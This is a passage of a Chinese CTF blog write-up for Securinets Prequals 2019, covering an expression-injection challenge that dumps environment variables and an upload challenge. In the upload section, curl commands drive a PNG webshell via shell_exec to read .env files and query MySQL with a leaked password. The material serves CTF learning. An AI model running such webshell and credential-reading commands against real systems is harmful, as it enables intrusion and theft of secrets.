+</li>
+</ul>
+<p>容易知道是图标坐标计算方式<br>注意到requeset方法：<br><code>$.get( &quot;/default&quot;, { &quot;formula&quot;: formula, &quot;values&quot;:{&quot;v1&quot;: &quot;STC&quot;,&quot;v2&quot;:&quot;PLA&quot;,&quot;v3&quot;:&quot;SDF&quot;,&quot;v4&quot;:&quot;OCK&quot;} }   )</code><br>所以可以请求：</p>
+<blockquote>
+<p>GET /default?formula=KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc=&amp;values[v1]=STC&amp;values[v2]=PLA&amp;values[v3]=SDF&amp;values[v4]=OCK HTTP/1.1<br>Host: web1.ctfsecurinets.com<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1</p>
+</blockquote>
+<p>得到response：</p>
+<blockquote>
+<p>HTTP/1.1 200 OK<br>Server: nginx/1.10.3 (Ubuntu)<br>Date: Fri, 29 Mar 2019 16:19:16 GMT<br>Content-Type: text/html; charset=UTF-8<br>Connection: close<br>Cache-Control: private, must-revalidate<br>pragma: no-cache<br>expires: -1<br>Content-Length: 15</p>
+<p>188698.16666667</p>
+</blockquote>
+<p>formula为一种自定义计算方式，中文意思为<strong>公式</strong><br>所以试着改为<code>2*4（Mio0）&lt;base64&gt;</code>即<code>formula=Mio0</code><br>返回了8<br>因此应该有一express的解析器（ 例：<a href="https://github.com/symfony/expression-language）" target="_blank" rel="noopener">https://github.com/symfony/expression-language）</a></p>
+<p>当formula为任意字符串时，返回错误：</p>
+<blockquote>
+<p>HTTP/1.1 200 OK<br>Server: nginx/1.10.3 (Ubuntu)<br>Date: Fri, 29 Mar 2019 16:26:21 GMT<br>Content-Type: text/html; charset=UTF-8<br>Connection: close<br>Cache-Control: private, must-revalidate<br>pragma: no-cache<br>expires: -1<br>Content-Length: 84</p>
+<p>Variable “df” is not valid around position 1 for expression <code>df</code>. Did you mean “v1”?</p>
+</blockquote>
+<p>于是试着改为djE=(v1)，得到：</p>
+<blockquote>
+<p>HTTP/1.1 500 Internal Server Error<br>Server: nginx/1.10.3 (Ubuntu)<br>Date: Fri, 29 Mar 2019 16:39:07 GMT<br>Content-Type: text/html; charset=UTF-8<br>Connection: close<br>Content-Length: 144</p>
+<p>object(App\Entity\STC)#233 (4) {<br>  [“id”:”App\Entity\STC”:private]=&gt;<br>  NULL<br>  [“avg”]=&gt;<br>  int(100)<br>  [“mpk”]=&gt;<br>  int(54)<br>  [“drf”]=&gt;<br>  int(3)<br>}</p>
+</blockquote>
+<p>指向了变量属性，并返回了一些组件，打印出了所有对象<br>因此，值是定义在classpath中的类的对象，添加新的变量v0</p>
+<pre><code>/default?formula=djA=&amp;values[v0]=this&amp;values[v1]=STC&amp;values[v2]=PLA&amp;values[v3]=SDF&amp;values[v4]=OCK
+</code></pre><p>返回了所有环境变量，搜索<code>flag</code>关键字，最终找到</p>
+<h2 id="Unbreakable-Uploader"><a href="#Unbreakable-Uploader" class="headerlink" title="Unbreakable Uploader"></a>Unbreakable Uploader</h2><p>文件上传<br>图片马<br>图片马能够解析的条件是</p>
+<pre><code>AddHandler application/x-httpd-php .png
+AddHandler application/x-httpd-php5 .png
+</code></pre><blockquote>
+<p>Files ending in .png will not execute php code even if they contain php code. You can however execute this code either through a LFI or by uploading a .htaccess file which will add a php handler for .png or in the case of Apache you could use a double file extansion, ie: phppng.php.phppng.</p>
+</blockquote>
+<p>访问控制列表，尝试添加自定义访问规则<br>所以还要知道的就是.htaccess文件</p>
+<p>要求访问数据库<br>接下来使用curl协议：</p>
+<pre><code>#curl -i -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=id&quot;
+
+#curl -i -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=pwd&quot;
+
+#curl -i -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=ls ../../../ -lA&quot;
+
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=cat ../../../.env&quot;
+
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database symfony_task_3 -e &apos;show tables&apos;&quot;
+
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost -e &apos;show databases&apos;&quot;
+
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database big_database -e &apos;show tables&apos;&quot;
+
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e64d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database big_database -e &apos;select * from user_details&apos; | grep Securinets&quot;
+</code></pre><p> reference：<a href="https://github.com/mohamedaymenkarmous/CTF/tree/master/CTFSecurinetsQuals2019#unbreakable-uploader" target="_blank" rel="noopener">https://github.com/mohamedaymenkarmous/CTF/tree/master/CTFSecurinetsQuals2019#unbreakable-uploader</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="http://microvorld.com">damn1t</a>
+            <p>原文链接: <a href="http://microvorld.com/2019/03/30/CTF/Securinets Prequals CTF 2019/">http://microvorld.com/2019/03/30/CTF/Securinets Prequals CTF 2019/</a>
+            <p>发表日期: <a href="http://microvorld.com/2019/03/30/CTF/Securinets Prequals CTF 2019/">三月 30日 2019, 9:20:33</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2019/04/01/CTF/fireshell ctf(vice)/" title= fireshell ctf2019 vice >
+                    <div class="nextTitle">fireshell ctf2019 vice</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/03/29/system/command/" title=  >
+                    <div class="prevTitle">[Untitled Post]</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:870059622@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/microvorld" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/flatline" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Securinets-Prequals-CTF-2019"><span class="toc-number">1.</span> <span class="toc-text">Securinets Prequals CTF 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#custom-location"><span class="toc-number">1.1.</span> <span class="toc-text">custom location</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#方法二"><span class="toc-number">1.1.1.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-injected"><span class="toc-number">1.2.</span> <span class="toc-text">sql injected</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Beginner’s-Luck"><span class="toc-number">1.3.</span> <span class="toc-text">Beginner’s Luck</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trading-values"><span class="toc-number">1.4.</span> <span class="toc-text">Trading values</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unbreakable-Uploader"><span class="toc-number">1.5.</span> <span class="toc-text">Unbreakable Uploader</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 26 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2019/04/11/cve/CVE-2018-17057/" >[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2019/04/10/misc/png隐写/" >[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2019/04/09/algorithm/傅里叶/" >[Untitled Post]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/09/08/pwn/pwnable1/" >pwnable.kr(1-2)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2019/04/09/图像/watermark/" >[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span><a class="archive-post-title" href= "/2019/04/08/CTF/MidnightSun CTF 2019/" >MidnightSun CTF 2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2019/04/01/CTF/fireshell ctf(vice)/" >fireshell ctf2019 vice</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/30</span><a class="archive-post-title" href= "/2019/03/30/CTF/Securinets Prequals CTF 2019/" >Securinets Prequals CTF 2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href= "/2019/03/26/CTF/hackim ctf/" >hackim web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href= "/2019/03/25/vulnerable/xxe/" >[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/18</span><a class="archive-post-title" href= "/2019/03/18/system/linux/" >[Untitled Post]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/2018/05/29/web/序列化/" >php反序列化漏洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2017/12/31/随笔/Create/" >To2018</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2018/05/27/CTF/cbc/" >CBC字节翻转攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2018/05/27/CTF/php伪协议/" >php伪协议</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/03/29/system/command/" >[Untitled Post]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/17</span><a class="archive-post-title" href= "/2018/03/17/web/aboutproxy/" >正向代理与反向代理</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/09/11/CTF/jinja2/" >由Musee de X(强网杯2017)到jinja2模板注入</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href= "/2017/12/04/随笔/无比芜杂的心绪/" >无比芜杂的心绪</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/04/03/CTF/VolgaCTF 2019(web)/" >VolgaCTF 2019 Quals</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/19/web/编码与解码/" >关于编码与解码的思考</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2017/11/27/CTF/binwalk分离图片/" >用binwalk进行图片分离</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2017/11/26/web/动态请求和静态请求/" >动态请求和静态请求</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2017/11/24/CTF/linux 基本命令学习/" >linux 基本命令学习</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/03/29/system/proc/" >[Untitled Post]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/15/CTF/hash扩展攻击/" >实验吧：让我进去</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf.misc"><span class="iconfont-archer">&#xe606;</span>ctf.misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="心绪"><span class="iconfont-archer">&#xe606;</span>心绪</span>
+    
+        <span class="sidebar-tag-name" data-tags="随笔"><span class="iconfont-archer">&#xe606;</span>随笔</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: '/',
+        author: 'damn1t'
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+    
+    </body>
+</html>
+
+
